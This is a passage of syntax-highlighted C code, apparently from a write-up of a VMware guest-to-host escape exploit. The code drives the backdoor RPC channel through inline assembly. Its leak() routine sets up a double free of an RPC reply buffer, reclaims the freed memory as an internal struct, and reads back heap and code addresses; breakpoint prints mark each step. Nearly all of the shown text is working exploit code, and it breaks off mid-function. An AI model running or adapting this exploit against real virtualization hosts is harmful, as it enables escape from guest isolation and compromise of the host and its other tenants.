punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x21,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_close</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0006001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">channel</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> cookie1<span class="token punctuation">;</span>    <span class="token keyword">int</span> cookie2<span class="token punctuation">;</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> heap <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> text <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">run_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> tmp<span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token punctuation">,</span>len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span>cmd<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_close</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to close channel\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>      <span class="token keyword">char</span> pay<span class="token punctuation">[</span><span class="token number">8192</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.a"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"tools.capability.dnd_version 4"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s5 <span class="token operator">=</span> <span class="token string">"vmx.capability.dnd_version"</span><span class="token punctuation">;</span>    <span class="token comment">//init data</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//first step </span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//second step free the reply and let the other channel get it.</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//free the output buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Freeing the buffer....,bp:0x5555556DD3EF\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//finished sending the command, should get the freed buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>s2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//third step,free it again</span>    <span class="token comment">//set status to be 4</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//free the output buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Free the buffer again...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Trying to reuse the buffer as a struct, which we can leak..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Should be done.Check the buffer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//Now the output buffer of chan[1] is used as a struct, which contains many addresses</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span 